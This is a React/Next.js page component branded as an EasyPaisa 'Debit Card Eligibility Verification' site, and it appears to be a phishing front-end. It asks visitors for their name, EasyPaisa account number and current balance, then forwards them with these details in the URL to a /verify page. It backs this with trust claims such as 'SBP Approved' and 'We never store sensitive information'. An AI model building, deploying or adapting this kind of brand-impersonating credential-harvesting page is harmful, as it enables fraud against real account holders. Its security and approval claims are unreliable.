"use client"

import { useState } from "react"
import { submitVerification } from "./actions"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Shield, Users, Clock, CheckCircle, CreditCard, Star, Timer, Sparkles } from "lucide-react"
import { EasyPaisaLogo } from "@/components/easypaisa-logo"

export default function VerificationPage() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [message, setMessage] = useState<{ type: "success" | "error"; text: string } | null>(null)

  async function handleSubmit(formData: FormData) {
    setIsSubmitting(true)
    setMessage(null)

    const result = await submitVerification(formData)

    if (result.success) {
      // Redirect to verification page with customer data
      const accountNumber = formData.get("accountNumber") as string
      const currentBalance = formData.get("currentBalance") as string
      const fullName = formData.get("fullName") as string

      const params = new URLSearchParams({
        account: accountNumber,
        balance: currentBalance,
        name: fullName,
      })

      window.location.href = `/verify?${params.toString()}`
    } else {
      setMessage({ type: "error", text: result.error! })
    }

    setIsSubmitting(false)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-green-50 to-teal-50">
      {/* Enhanced Mobile-First Header */}
      <div className="bg-gradient-to-r from-emerald-600 via-green-600 to-teal-600 py-4 sm:py-6">
        <div className="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8">
          <div className="flex flex-col sm:flex-row items-center justify-between space-y-3 sm:space-y-0">
            <EasyPaisaLogo width={180} height={60} variant="white" clickable={true} mobile={true} />
            <div className="flex items-center space-x-2 sm:space-x-4">
              <Badge className="bg-white/20 text-white border-white/30 px-3 py-1.5 text-xs sm:text-sm">
                <Sparkles className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
                Verified Platform
              </Badge>
              <Badge className="bg-white/20 text-white border-white/30 px-3 py-1.5 text-xs sm:text-sm">
                <Star className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2 fill-current" />
                Pakistan's #1
              </Badge>
            </div>
          </div>
        </div>
      </div>

      <main className="max-w-6xl mx-auto px-3 sm:px-6 lg:px-8 py-4 sm:py-8">
        {/* Mobile-Optimized Hero Section */}
        <div className="text-center mb-12 sm:mb-20">
          {/* Pakistan's #1 Badge */}
          <div className="flex justify-center mb-6 sm:mb-10">
            <Badge className="bg-gradient-to-r from-emerald-500 to-green-600 text-white border-0 px-4 sm:px-8 py-2 sm:py-3 text-sm sm:text-base font-semibold shadow-lg hover:shadow-xl transition-shadow">
              <Star className="w-4 h-4 sm:w-5 sm:h-5 mr-1 sm:mr-2 fill-current" />
              Pakistan's #1 Digital Payment Platform
            </Badge>
          </div>

          {/* Mobile-Responsive Main Heading */}
          <h1 className="text-4xl sm:text-6xl md:text-7xl font-bold bg-gradient-to-r from-emerald-600 to-green-700 bg-clip-text text-transparent mb-6 sm:mb-8 leading-tight px-2">
            Debit Card Eligibility
            <br />
            <span className="text-3xl sm:text-5xl md:text-6xl">Verification</span>
          </h1>

          {/* Mobile-Optimized Subtitle */}
          <p className="text-base sm:text-xl text-gray-600 mb-8 sm:mb-12 max-w-3xl mx-auto leading-relaxed px-4">
            Get instant verification for your EasyPaisa Debit Card. Join millions of satisfied customers with our secure
            and lightning-fast verification process.
          </p>

          {/* Mobile-Responsive Feature Badges */}
          <div className="flex flex-wrap justify-center gap-3 sm:gap-6 mb-10 sm:mb-16 px-4">
            <Badge
              variant="outline"
              className="bg-white text-emerald-600 border-emerald-200 px-3 sm:px-6 py-2 sm:py-3 text-sm sm:text-base shadow-md hover:shadow-lg transition-shadow"
            >
              <Shield className="w-4 h-4 sm:w-5 sm:h-5 mr-1 sm:mr-2" />
              Bank-Level Security
            </Badge>
            <Badge
              variant="outline"
              className="bg-white text-emerald-600 border-emerald-200 px-3 sm:px-6 py-2 sm:py-3 text-sm sm:text-base shadow-md hover:shadow-lg transition-shadow"
            >
              <Timer className="w-4 h-4 sm:w-5 sm:h-5 mr-1 sm:mr-2" />
              2-Minute Process
            </Badge>
            <Badge
              variant="outline"
              className="bg-white text-emerald-600 border-emerald-200 px-3 sm:px-6 py-2 sm:py-3 text-sm sm:text-base shadow-md hover:shadow-lg transition-shadow"
            >
              <CheckCircle className="w-4 h-4 sm:w-5 sm:h-5 mr-1 sm:mr-2" />
              99.9% Success Rate
            </Badge>
          </div>

          {/* Mobile-Responsive Stats Cards */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-8 mb-12 sm:mb-20 px-2">
            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300 hover:-translate-y-1">
              <CardContent className="p-4 sm:p-8 text-center">
                <div className="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-3 sm:mb-6 shadow-lg">
                  <Users className="w-6 h-6 sm:w-8 sm:h-8 text-white" />
                </div>
                <div className="text-2xl sm:text-3xl font-bold text-emerald-600 mb-1 sm:mb-2">2M+</div>
                <div className="text-gray-600 font-medium text-sm sm:text-base">Cards Activated</div>
              </CardContent>
            </Card>

            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300 hover:-translate-y-1">
              <CardContent className="p-4 sm:p-8 text-center">
                <div className="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-3 sm:mb-6 shadow-lg">
                  <Star className="w-6 h-6 sm:w-8 sm:h-8 text-white fill-current" />
                </div>
                <div className="text-2xl sm:text-3xl font-bold text-emerald-600 mb-1 sm:mb-2">99.9%</div>
                <div className="text-gray-600 font-medium text-sm sm:text-base">Success Rate</div>
              </CardContent>
            </Card>

            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300 hover:-translate-y-1">
              <CardContent className="p-4 sm:p-8 text-center">
                <div className="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-3 sm:mb-6 shadow-lg">
                  <Clock className="w-6 h-6 sm:w-8 sm:h-8 text-white" />
                </div>
                <div className="text-2xl sm:text-3xl font-bold text-emerald-600 mb-1 sm:mb-2">2 Min</div>
                <div className="text-gray-600 font-medium text-sm sm:text-base">Average Time</div>
              </CardContent>
            </Card>

            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300 hover:-translate-y-1">
              <CardContent className="p-4 sm:p-8 text-center">
                <div className="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-3 sm:mb-6 shadow-lg">
                  <Shield className="w-6 h-6 sm:w-8 sm:h-8 text-white" />
                </div>
                <div className="text-2xl sm:text-3xl font-bold text-emerald-600 mb-1 sm:mb-2">24/7</div>
                <div className="text-gray-600 font-medium text-sm sm:text-base">Support</div>
              </CardContent>
            </Card>
          </div>

          {/* Mobile-Responsive Feature Sections */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 sm:gap-12 mb-12 sm:mb-20 px-4">
            <div className="text-center group">
              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-3xl flex items-center justify-center mx-auto mb-6 sm:mb-8 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-emerald-600" />
              </div>
              <h3 className="text-xl sm:text-2xl font-bold text-emerald-600 mb-3 sm:mb-4">Secure Verification</h3>
              <p className="text-gray-600 leading-relaxed text-base sm:text-lg">
                Your data is protected with bank-level security and end-to-end encryption. We never store sensitive
                information.
              </p>
            </div>

            <div className="text-center group">
              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-3xl flex items-center justify-center mx-auto mb-6 sm:mb-8 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                <CreditCard className="w-8 h-8 sm:w-10 sm:h-10 text-emerald-600" />
              </div>
              <h3 className="text-xl sm:text-2xl font-bold text-emerald-600 mb-3 sm:mb-4">Instant Verification</h3>
              <p className="text-gray-600 leading-relaxed text-base sm:text-lg">
                Get results in seconds, not days. Our AI-powered system ensures lightning-fast processing and approval.
              </p>
            </div>

            <div className="text-center group">
              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-3xl flex items-center justify-center mx-auto mb-6 sm:mb-8 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                <Users className="w-8 h-8 sm:w-10 sm:h-10 text-emerald-600" />
              </div>
              <h3 className="text-xl sm:text-2xl font-bold text-emerald-600 mb-3 sm:mb-4">Trusted by Millions</h3>
              <p className="text-gray-600 leading-relaxed text-base sm:text-lg">
                Join millions of satisfied EasyPaisa users across Pakistan who trust our platform for their financial
                needs.
              </p>
            </div>
          </div>

          {/* Mobile-Optimized CTA Button */}
          <div className="flex justify-center mb-12 sm:mb-16 px-4">
            <Button
              size="lg"
              className="bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 text-white px-8 sm:px-16 py-4 sm:py-6 text-lg sm:text-xl font-bold rounded-2xl shadow-2xl hover:shadow-3xl transition-all duration-300 transform hover:scale-105 active:scale-95 w-full sm:w-auto max-w-sm"
              onClick={() => {
                const formSection = document.getElementById("verification-form-section")
                formSection?.scrollIntoView({ behavior: "smooth" })
              }}
            >
              <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 mr-3 sm:mr-4" />
              Start Verification Process
            </Button>
          </div>
        </div>

        {/* Mobile-Optimized Verification Form Section */}
        <div id="verification-form-section" className="max-w-lg mx-auto px-4">
          <Card className="shadow-2xl border-0 overflow-hidden">
            <CardHeader className="bg-gradient-to-r from-emerald-600 to-green-600 text-white p-6 sm:p-8">
              <CardTitle className="text-center text-xl sm:text-2xl font-bold">Verify Your Eligibility</CardTitle>
              <CardDescription className="text-emerald-100 text-center text-base sm:text-lg">
                Enter your account details to begin instant verification
              </CardDescription>
            </CardHeader>
            <CardContent className="p-6 sm:p-10">
              <form id="verification-form" action={handleSubmit} className="space-y-6 sm:space-y-8">
                <div>
                  <Label
                    htmlFor="fullName"
                    className="text-sm sm:text-base font-semibold text-gray-700 mb-2 sm:mb-3 block"
                  >
                    Full Name
                  </Label>
                  <Input
                    id="fullName"
                    name="fullName"
                    placeholder="Enter your full name as per CNIC"
                    required
                    disabled={isSubmitting}
                    className="h-12 sm:h-12 text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
                  />
                </div>

                <div>
                  <Label
                    htmlFor="accountNumber"
                    className="text-sm sm:text-base font-semibold text-gray-700 mb-2 sm:mb-3 block"
                  >
                    EasyPaisa Account Number
                  </Label>
                  <Input
                    id="accountNumber"
                    name="accountNumber"
                    placeholder="03XXXXXXXXX"
                    pattern="03\d{9}"
                    required
                    disabled={isSubmitting}
                    className="h-12 sm:h-12 text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
                    inputMode="numeric"
                  />
                </div>

                <div>
                  <Label
                    htmlFor="currentBalance"
                    className="text-sm sm:text-base font-semibold text-gray-700 mb-2 sm:mb-3 block"
                  >
                    Current Account Balance (PKR)
                  </Label>
                  <Input
                    id="currentBalance"
                    name="currentBalance"
                    type="number"
                    step="0.01"
                    min="0"
                    placeholder="Enter current balance amount"
                    required
                    disabled={isSubmitting}
                    className="h-12 sm:h-12 text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
                    inputMode="decimal"
                  />
                </div>

                <div>
                  <Label
                    htmlFor="securityComment"
                    className="text-sm sm:text-base font-semibold text-gray-700 mb-2 sm:mb-3 block"
                  >
                    Security Comment (Optional)
                  </Label>
                  <Textarea
                    id="securityComment"
                    name="securityComment"
                    placeholder="Any additional information or security notes"
                    rows={3}
                    disabled={isSubmitting}
                    className="text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg resize-none"
                  />
                </div>

                {message && (
                  <div
                    className={`p-4 rounded-xl text-sm sm:text-base font-medium ${
                      message.type === "success"
                        ? "bg-green-50 text-green-700 border-2 border-green-200"
                        : "bg-red-50 text-red-700 border-2 border-red-200"
                    }`}
                  >
                    {message.type === "success" && <CheckCircle className="w-4 h-4 sm:w-5 sm:h-5 inline mr-2" />}
                    {message.text}
                  </div>
                )}

                <Button
                  type="submit"
                  className="w-full bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 py-4 text-base sm:text-lg font-bold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 active:scale-95"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <Clock className="w-5 h-5 sm:w-6 sm:h-6 mr-2 sm:mr-3 animate-spin" />
                      Processing Verification...
                    </>
                  ) : (
                    <>
                      <CheckCircle className="w-5 h-5 sm:w-6 sm:h-6 mr-2 sm:mr-3" />
                      Verify Eligibility Now
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>

        {/* Mobile-Responsive Trust Indicators */}
        <div className="text-center mt-12 sm:mt-20">
          <div className="flex flex-wrap justify-center items-center gap-4 sm:gap-8 mb-6 sm:mb-8 px-4">
            <Badge variant="outline" className="bg-white text-gray-600 border-gray-200 px-3 py-1.5 text-xs sm:text-sm">
              <Shield className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
              SSL Secured
            </Badge>
            <Badge variant="outline" className="bg-white text-gray-600 border-gray-200 px-3 py-1.5 text-xs sm:text-sm">
              <CheckCircle className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
              SBP Approved
            </Badge>
            <Badge variant="outline" className="bg-white text-gray-600 border-gray-200 px-3 py-1.5 text-xs sm:text-sm">
              <Users className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
              2M+ Users Trust Us
            </Badge>
          </div>
        </div>

        {/* Mobile-Responsive Footer */}
        <div className="text-center mt-12 sm:mt-16 text-gray-500 px-4">
          <p className="text-sm sm:text-lg">© 2024 EasyPaisa. All rights reserved.</p>
          <div className="flex flex-wrap justify-center gap-4 mt-2">
            <a href="#" className="text-emerald-600 hover:underline font-medium text-sm sm:text-base">
              Privacy Policy
            </a>
            <span className="text-gray-400">|</span>
            <a href="#" className="text-emerald-600 hover:underline font-medium text-sm sm:text-base">
              Terms of Service
            </a>
          </div>
        </div>
      </main>
    </div>
  )
}
